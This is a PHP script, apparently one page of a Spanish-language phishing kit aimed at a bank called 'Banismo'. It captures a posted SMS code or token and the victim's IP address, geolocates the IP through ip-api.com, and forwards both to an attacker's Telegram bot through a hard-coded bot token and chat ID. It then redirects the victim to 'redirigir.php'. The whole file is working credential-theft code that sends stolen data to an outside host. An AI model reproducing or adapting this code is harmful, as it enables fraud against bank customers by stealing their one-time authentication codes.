<?php
$token = '6588209506:AAE0tCvE9p3LMROYDpYE8CGxVF6QV621g1w';
$website = 'https://api.telegram.org/bot'.$token;

    $ip = $_SERVER["REMOTE_ADDR"];
    $chat_id = "1900569011";
   



if (isset($_POST["data"])) {
    $data = $_POST['data'];
    
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);

 
 
    //$time = gmstrftime("%Y. %B %d. %A. %X %Z");
    $agent = $_SERVER["HTTP_USER_AGENT"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);

    
    $msg = "\nBanismo -token 2 🤔\n📧sms: => " . $data . "\n📍 IP: " . $ip . "\n";
            
    
     $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
            file_get_contents($url);
    
        
        echo '<script>window.location.href = "redirigir.php";</script>';
}
    
function get_browser_name($user_agent)
{
    if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
        return "Opera";
    }
    if (strpos($user_agent, "Edge")) {
        return "Edge";
    }
    if (strpos($user_agent, "Chrome")) {
        return "Chrome";
    }
    if (strpos($user_agent, "Safari")) {
        return "Safari";
    }
    if (strpos($user_agent, "Firefox")) {
        return "Firefox";
    }
    if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
        return "Internet Explorer";
    }
    return "Other";
}

?>